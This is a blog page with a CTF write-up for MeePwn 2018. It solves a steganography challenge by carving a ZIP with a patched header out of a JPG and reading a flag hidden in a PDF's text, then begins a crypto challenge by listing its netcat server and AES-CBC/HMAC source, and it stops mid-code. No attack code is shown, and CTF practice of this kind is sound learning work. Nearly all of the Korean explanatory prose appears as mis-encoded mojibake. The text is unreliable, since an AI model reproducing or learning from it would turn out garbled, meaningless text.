<!DOCTYPE html>
<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@100;300;400;500;700;900&display=swap"
    rel="stylesheet">

<html class="no-js">
<head>
    <meta charset="utf-8">

    <base href="https://mingzz1.github.io/">
    <title> mingzzi&#39;s blog </title>
    <meta name="description" content="mingzzi&#39;s blog">

    <link rel="canonical" href="https://mingzz1.github.io/ctf/2018/2018/07/17/meepwn2018-writeup.html/">
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no" />

    
    <link rel="stylesheet" href="https://mingzz1.github.io/sass/main.min.94d6e676b5b11c22f591951fd9b4e6ab0f6a3179daac45918d1fbc53ed631f00.css">

    <link rel="shortcut icon" href="https://mingzz1.github.io/img/favicon.ico" type="image/x-icon">

    <link rel="stylesheet" type="text/css"
        href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">


    <script src="https://code.jquery.com/jquery-1.12.4.min.js"
        integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>

    
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-130304424-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() { dataLayer.push(arguments); }
        gtag('js', new Date());

        gtag('config', 'UA-130304424-1');
    </script>

    
    <script data-ad-client="ca-pub-1587587893565234" async
        src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>

    <script>
        $(function () {
            $(".cat1>li").click(function () {
                $(this).siblings().find('ul').slideUp(300);
                $(this).find('ul').slideToggle(300);
            })

            $(window).scroll(function () {
                activeBg();
            });

            activeBg();


            $('.h-menu').click(function (e) {
                e.preventDefault();
                $('.side').addClass('on');
            });

            $('.close').click(function (e) {
                e.preventDefault();
                $('.side').removeClass('on');
            });

            $('ul.slide>li').click(function () {
                if ($(this).find('.down').hasClass('on')) {
                    $(this).find('.down').removeClass('on');
                    $(this).find('.down').prev().stop().slideUp(500);
                } else {
                    $(this).find('.down').addClass('on');
                    $(this).find('.down').prev().stop().slideDown(500);
                }
            })
        })

        function activeBg() {
            if ($(window).scrollTop() > 0) {
                $('.site-header').addClass('on');
            } else {
                $('.site-header').removeClass('on');
            }
        }

    </script>
</head>
<header class="site-header">
    <h1 class="web-t" onclick="window.location.href='/'"><span>def</span><em> ì²œë°©ì§€ì¶• ì–¼ë ëš±ë•…
        </em><span>(</span><i>ğŸ¤£</i><span>)</span>:<br />
        &nbsp;&nbsp;&nbsp;&nbsp;<span class="nbsp">title =</span> ë¹™ê¸€ë¹™ê¸€ ëŒì•„ê°€ëŠ” ìš°ë‹¹íƒ•íƒ• ì‹œíë¡œê·¸
        <br />
    </h1>

    <h1 class="mob-t" onclick="window.location.href='/'">
        <span>ì²œ/ì–¼/ë¹™/ëŒ(</span><i>ğŸ¤£</i><span>)</span>
        <br />ìš°ë‹¹íƒ•íƒ• ì‹œíë¡œê·¸
    </h1>

    <nav>
        <div class="h-menu">
            <span></span>
            <span></span>
            <span></span>
        </div>
        <div class="side">
            <div class="close">
                <span></span>
                <span></span>
            </div>
            <ul class="slide">
                <li class="on"><a href="#">All Post</a>
                </li>
                <li><a>Pentesting</a>
                    <ul>
                        <li><a href="https://mingzz1.github.io//pentesting/ios">iOS</a></li>
                        <li><a href="https://mingzz1.github.io//pentesting/android">Android</a></li>
                        <li><a href="https://mingzz1.github.io//pentesting/web">Web</a></li>
                        <li><a href="https://mingzz1.github.io//pentesting/cloud">Cloud</a></li>
                    </ul>
                    <span class="down"></span>
                </li>
                <li><a>Wargame</a>
                    <ul>
                        <li><a href="https://mingzz1.github.io//wargame/lord-of-sql-injection">Lord of SQL Injection</a></li>
                        <li><a href="https://mingzz1.github.io//wargame/pwnable.kr">Pwnable.kr</a></li>
                        <li><a href="https://mingzz1.github.io//wargame/wargame.kr">Wargame.kr</a></li>
                        <li><a href="https://mingzz1.github.io//wargame/xss-game">XSS Game</a></li>
                        <li><a href="https://mingzz1.github.io//wargame/owasp">OWASP-MSTG Crackmes</a></li>
                    </ul>
                    <span class="down"></span>
                </li>
                <li><a>CTF</a>
                    <ul>
                        <li><a href="https://mingzz1.github.io//ctf/2018">2018</a></li>
                        <li><a href="https://mingzz1.github.io//ctf/2019">2019</a></li>
                    </ul>
                    <span class="down"></span>
                </li>
                <li><a>Error</a>
                    <ul>
                        <li><a href="https://mingzz1.github.io//error/linux">Linux</a></li>
                        <li><a href="https://mingzz1.github.io//error/windows">Windows</a></li>
                        <li><a href="https://mingzz1.github.io//error/python">Python</a></li>
                    </ul>
                    <span class="down"></span>
                </li>
                <li><a>Development</a>
                    <ul>
                        <li><a href="https://mingzz1.github.io//development/basic">Basic</a></li>
                        <li><a href="https://mingzz1.github.io//development/web">Web</a></li>
                        <li><a href="https://mingzz1.github.io//development/mobile">Mobile</a></li>
                        <li><a href="https://mingzz1.github.io//development/database">Database</a></li>
                        <li><a href="https://mingzz1.github.io//development/docker">Docker</a></li>
                        <li><a href="https://mingzz1.github.io//development/github-blog">Github Blog</a></li>
                        <li><a href="https://mingzz1.github.io//development/secure-coding">Secure Coding</a></li>
                    </ul>
                    <span class="down"></span>
                </li>
                <hr />
                <li><a href="https://mingzz1.github.io//about">About</a></li>
                <li><a href="https://mingzz1.github.io//archive">Archive</a></li>
                <li><a href="https://mingzz1.github.io//tags">Tag</a></li>
            </ul>
        </div>
    </nav>
</header>

<body>
    <div class="content">
        
        

<article>
    <header>
        <h1 class="title">[MeePwn2018] WHITE SNOW, BLACK SHADOW / ESOR / EZCHALLZ Write up</h1>
        <p class="meta">
            2018-07-17
        </p>
    </header>
    <section class="post-content"><p>ì§€ë‚œ ì£¼ë§ì— <code>MeePwn CTF</code>ê°€ ìˆì—ˆë‹¤.
ë‹¤ë¥¸ ì¼ì´ ìˆì–´ í’€íƒ€ì„ìœ¼ë¡œ ì°¸ì—¬í•˜ì§„ ëª»í–ˆëŠ”ë°, ê·¸ë˜ë„ ì‰¬ìš´ ëª‡ ë¬¸ì œë¥¼ í’€ì–´ Write-upì„ ì‘ì„± í•´ ë³´ì•˜ë‹¤.</p>
<h3 id="misc-white-snow-black-shadow">[MISC] WHITE SNOW, BLACK SHADOW</h3>
<p>ì²« ë²ˆì§¸ë¡œ í’€ì–´ë³¸ ë¬¸ì œëŠ” <code>WHITE SNOW, BLACK SHADOW</code> ë¬¸ì œì´ë‹¤.
ë¬¸ì œ ì •ë³´ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">Finally we caught the image in criminal communication.
But Holmes, why are they crying?
</code></pre></td></tr></table>
</div>
</div><p>ë¬¸ì œ ì •ë³´ì™€ í•¨ê»˜ ì²¨ë¶€ íŒŒì¼ì„ ë‹¤ìš´ë°›ì„ ìˆ˜ ìˆë‹¤.
íŒŒì¼ì„ ë‹¤ìš´ë°›ì•„ ì••ì¶•ì„ í’€ë©´ <code>evidence.jpg</code>ë¼ëŠ” ì‚¬ì§„ íŒŒì¼ì„ í•˜ë‚˜ ì–»ì„ ìˆ˜ ìˆë‹¤.</p>
<p><img src="/images/CTF/MeePwn2018/solved/meepwn_01.jpg" alt=""></p>
<p>ì‚¬ì§„ì—ëŠ” ë”±íˆ ì´ìƒì´ ì—†ì–´ë³´ì—¬, <code>Hex Editor</code>ë¥¼ ì‚¬ìš© í•´ í—¥ìŠ¤ ê°’ì„ í™•ì¸ í•´ ë³´ì•˜ë‹¤.
íŒŒì¼ì˜ ì²« ë¶€ë¶„ì€ ì •ìƒì ì¸ <code>JPG</code> íŒŒì¼ì˜ í—¤ë”ê°€ ìˆì—ˆë‹¤.</p>
<p><img src="/images/CTF/MeePwn2018/solved/meepwn_02.png" alt=""></p>
<p>ê·¸ëŸ°ë° ë§¨ ë§ˆì§€ë§‰ ë¶€ë¶„ì—ì„œ ì•„ë˜ì™€ ê°™ì´ <code>message.pdf</code>ë¼ëŠ” ë¬¸ìì—´ê³¼ <code>PK</code>ê°€ ìˆëŠ” ê²ƒì„ ì°¾ì„ ìˆ˜ ìˆì—ˆë‹¤.</p>
<p><img src="/images/CTF/MeePwn2018/solved/meepwn_03.png" alt=""></p>
<p><code>PK</code>ë¼ëŠ” íŒŒì¼ í—¤ë”ë¥¼ ì–´ë”˜ê°€ì—ì„œ ë³¸ ê¸°ì–µì´ ë‚˜ ì¸í„°ë„·ì— ê²€ìƒ‰ì„ í•´ ë³´ì•˜ë”ë‹ˆ <code>ZIP</code> íŒŒì¼ì˜ í—¤ë”ë¼ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆì—ˆë‹¤.</p>
<p><img src="/images/CTF/MeePwn2018/solved/meepwn_04.png" alt=""></p>
<p>ì‚¬ì§„ê³¼ ê°™ì´, <code>ZIP</code> íŒŒì¼ì˜ í—¤ë”ëŠ” <code>50 4b 03 04</code>ë¡œ ì‹œì‘í•˜ê²Œ ëœë‹¤.
ì‚¬ì§„ íŒŒì¼ì—ì„œ <code>ZIP</code> íŒŒì¼ì„ ì¶”ì¶œí•˜ê¸° ìœ„í•´, <code>50 4b 03 04</code>ë¥¼ ì°¾ì•„ ë³´ì•˜ë‹¤.
ê·¸ëŸ°ë° ì°¾ì•„ë³´ë‹ˆ <code>50 4b 05 06</code>ì€ ìˆì—ˆì§€ë§Œ <code>50 4b 03 04</code>ëŠ” ì°¾ì„ ìˆ˜ ì—†ì—ˆë‹¤.</p>
<p><img src="/images/CTF/MeePwn2018/solved/meepwn_05.png" alt=""></p>
<p>ì•„ë§ˆë„ íŒŒì¼ í—¤ë”ë¥¼ ì‚´ì§ ìˆ˜ì •í•´ ë‘” ê²ƒ ê°™ì•˜ë‹¤.
ê·¸ë˜ì„œ <code>evidence.jpg</code> íŒŒì¼ì—ì„œ <code>50 4b 05 06</code>ì„ <code>50 4b 03 04</code>ë¡œ íŒ¨ì¹˜í•´ ì¤€ ë’¤, <code>WinHex</code> ë¼ëŠ” íˆ´ì„ ì´ìš© í•´ íŒŒì¼ì„ ì¶”ì¶œ í•´ ë³´ì•˜ë‹¤.</p>
<p><img src="/images/CTF/MeePwn2018/solved/meepwn_06.png" alt=""></p>
<p>ê·¸ ê²°ê³¼ ë‹¤ìŒê³¼ ê°™ì´ ì••ì¶• íŒŒì¼ì„ ì¶”ì¶œí•  ìˆ˜ ìˆì—ˆê³ , ì••ì¶• íŒŒì¼ ì•ˆì—ëŠ” <code>message.pdf</code> íŒŒì¼ì´ ìˆì—ˆë‹¤.
message.pdfì˜ ë‚´ìš©ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">â€œWhen you have eliminated the impossible, whatever remains, however improbable, must be the truth.â€

â€“ Sir Arthur Conan Doyle

What does that mean?
To me, this is all about logic. If you start with everything you can think of, and then eliminate those that are impossible, you are well on your way to a solution. Thatâ€™s the first stage of solving any mystery, whether itâ€™s a murder mystery in a book (or TV, or movie, orâ€¦) or somethingMeeyou expected to work, but didnâ€™t. You have to eliminate all the things that it couldnâ€™t possibly be, or you will have too many distractions. 

Once we clear out all the distractions, we can focus on what remains. Sometimes what is left is easy to believe, other times it can seem highly improbable. However, with the impossible eliminated, whatPwnremains are the only possible solutions. And oneCTFof them must be the truth.

Why is clearing out the impossible solutions important?
Sometimes, it can be hard to solve a{T3challenging situation even under the best of circumstances. A problem with lotsxt_of shiny things to look at can be distracting, and waste a great deal of our time.
While some impossibilities might be obvious, sometimesUndwe can be sucked in by an idea that3r_intrigues us, despite being impossible. Other times, it is only in close examination that the impossibility is revealed.

However, once we clear the clutter by removing all that is impossible, we are left with an easier solution. Gone are the impossibilities, botht3Xobvious and subtle. What is left can be gone over more quickly, and evaluated for probability or even likelihood.

This may be an iterative process, starting with the really obvious impossibilities, and then moving to the shiny distractions. Finally, as wet!!!!}work our way through the last of the options, we may still find ourselves weeding out additional impossibilities.
</code></pre></td></tr></table>
</div>
</div><p>ì²˜ìŒì—” ë”±íˆ ì´ìƒí•œ ì ì„ ëª»ëŠê¼ˆëŠ”ë°, ìì„¸íˆ ì½ì–´ë³´ë‹ˆ ë„ì–´ì“°ê¸°ê°€ ìˆì–´ì•¼ í•˜ëŠ” ë¶€ë¶„ì— ë¬¸ìì—´ì´ ì¡°ê¸ˆì”© ë“¤ì–´ìˆëŠ” ê²ƒì„ ë°œê²¬í•  ìˆ˜ ìˆì—ˆë‹¤.</p>
<blockquote>
<p>ex) or something<code>Mee</code>you expected to work,</p>
</blockquote>
<p>ë¬¸ì¥ì„ í•˜ë‚˜í•˜ë‚˜ ì½ì–´ë³´ë©° ë„ì–´ì“°ê¸°ê°€ ìˆì–´ì•¼ í•˜ëŠ” ìë¦¬ì— ë“¤ì–´ ìˆëŠ” ë¬¸ìì—´ì„ ì˜ë¼ ì´ì–´ë³´ë©´ flagë¥¼ ì™„ì„±í•  ìˆ˜ ìˆë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">FLAG : MeePwnCTF{T3xt_Und3r_t3Xt!!!!}
</code></pre></td></tr></table>
</div>
</div><hr>
<h3 id="crypto-esor">[CRYPTO] ESOR</h3>
<p>ë¬¸ì œ ì •ë³´ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">Howdy, howdy...
nc 206.189.92.209 12345
</code></pre></td></tr></table>
</div>
</div><p>ë˜í•œ í•¨ê»˜ ì•„ë˜ì™€ ê°™ì€ íŒŒì´ì¬ ì½”ë“œë¥¼ ì¤€ë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/python2</span>
<span style="color:#ff79c6">from</span> Crypto.Cipher <span style="color:#ff79c6">import</span> AES
<span style="color:#ff79c6">import</span> hmac<span style="color:#ff79c6">,</span> hashlib
<span style="color:#ff79c6">import</span> os
<span style="color:#ff79c6">import</span> sys

menu <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;&#34;Choose one:
</span><span style="color:#f1fa8c">1. encrypt data
</span><span style="color:#f1fa8c">2. decrypt data
</span><span style="color:#f1fa8c">3. quit
</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>

<span style="color:#ff79c6">class</span> <span style="color:#50fa7b">Unbuffered</span>(<span style="color:#8be9fd;font-style:italic">object</span>):
    <span style="color:#ff79c6">def</span> __init__(self, stream):
        self<span style="color:#ff79c6">.</span>stream <span style="color:#ff79c6">=</span> stream
    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">write</span>(self, data):
        self<span style="color:#ff79c6">.</span>stream<span style="color:#ff79c6">.</span>write(data)
        self<span style="color:#ff79c6">.</span>stream<span style="color:#ff79c6">.</span>flush()
    <span style="color:#ff79c6">def</span> __getattr__(self, attr):
        <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">getattr</span>(self<span style="color:#ff79c6">.</span>stream, attr)

sys<span style="color:#ff79c6">.</span>stdout <span style="color:#ff79c6">=</span> Unbuffered(sys<span style="color:#ff79c6">.</span>stdout)
sys<span style="color:#ff79c6">.</span>stderr <span style="color:#ff79c6">=</span> None

encrypt_key <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\xff</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">32</span>
secret <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;MeePwnCTF{#flag_here#}&#39;</span>
hmac_secret <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
blocksize <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">16</span>
hmac_size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">20</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">pad</span>(msg):
	padlen <span style="color:#ff79c6">=</span> blocksize <span style="color:#ff79c6">-</span> (<span style="color:#8be9fd;font-style:italic">len</span>(msg) <span style="color:#ff79c6">%</span> blocksize) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>
	<span style="color:#ff79c6">return</span> os<span style="color:#ff79c6">.</span>urandom(padlen) <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">chr</span>(padlen)

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">unpad</span>(msg):
	<span style="color:#ff79c6">return</span> msg[:<span style="color:#ff79c6">-</span>(<span style="color:#8be9fd;font-style:italic">ord</span>(msg[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>)]

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">compute_hmac</span>(msg):
	<span style="color:#ff79c6">return</span> hmac<span style="color:#ff79c6">.</span>new(hmac_secret, msg, digestmod<span style="color:#ff79c6">=</span>hashlib<span style="color:#ff79c6">.</span>sha1)<span style="color:#ff79c6">.</span>digest()

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">encrypt</span>(prefix<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;&#39;</span>, suffix<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;&#39;</span>):
	_enc <span style="color:#ff79c6">=</span> prefix <span style="color:#ff79c6">+</span> secret <span style="color:#ff79c6">+</span> suffix
	_enc<span style="color:#ff79c6">+=</span> compute_hmac(_enc)
	_enc<span style="color:#ff79c6">+=</span> pad(_enc)
	iv <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>urandom(<span style="color:#bd93f9">16</span>)
	_aes <span style="color:#ff79c6">=</span> AES<span style="color:#ff79c6">.</span>new(encrypt_key, AES<span style="color:#ff79c6">.</span>MODE_CBC, iv)
